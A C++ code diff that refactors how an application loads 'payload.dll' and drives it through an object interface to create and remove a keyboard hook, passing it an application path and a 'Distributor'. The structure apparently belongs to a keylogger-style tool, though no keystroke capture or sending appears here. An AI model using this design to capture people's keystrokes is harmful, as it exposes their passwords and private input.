@@ -3,15 +3,14 @@
 Application::Application(std::string const& appliPath)
 	: _appliPath(appliPath)
 {
-	_hookBuilder = NULL;
-	_hookDeleter = NULL;
-	_appliPathSetter = NULL;
+	_payload = NULL;
 }
 
 Application::~Application()
 {
-	if (_hookBuilder && _hookDeleter)
-		_hookDeleter();
+	if (_payload) {
+		_payload->deleteKeyboardHook();
+	}
 }
 
 void Application::init(void)
@@ -26,15 +25,11 @@ void Application::init(void)
 		_distributor = std::make_shared<Distributor>();
 		_distributor->init();
 
-		_dllHandler.loadLibrary("payload.dll");
-		_hookBuilder = (KBHookBuilder)_dllHandler.getSymbolAddr("CreateKeyboardHook");
-		_hookDeleter = (KBHookDeleter)_dllHandler.getSymbolAddr("DeleteKeyboardHook");
-		_appliPathSetter = (AppliPathSetter)_dllHandler.getSymbolAddr("SetApplicationPath");
-		_distriSetter = (DistributorSetter)_dllHandler.getSymbolAddr("SetDistributor");
-		
-		_appliPathSetter(_appliPath);
-		_distriSetter(_distributor);
-		_hookBuilder();
+		_dllLoader.load("payload.dll");
+		_payload = _dllLoader.getInstance();
+		_payload->setApplicationPath(_appliPath);
+		_payload->setDistributor(_distributor);
+		_payload->createKeyboardHook();
 	}
 	catch (std::exception const& e) {
 		throw (e);
@@ -54,8 +49,8 @@ void Application::loop(void)
 void Application::close(void)
 {
 	_distributor->destroy();
-	if (_hookDeleter) {
-		_hookDeleter();
+	if (_payload) {
+		_payload->deleteKeyboardHook();
 	}
 }
 
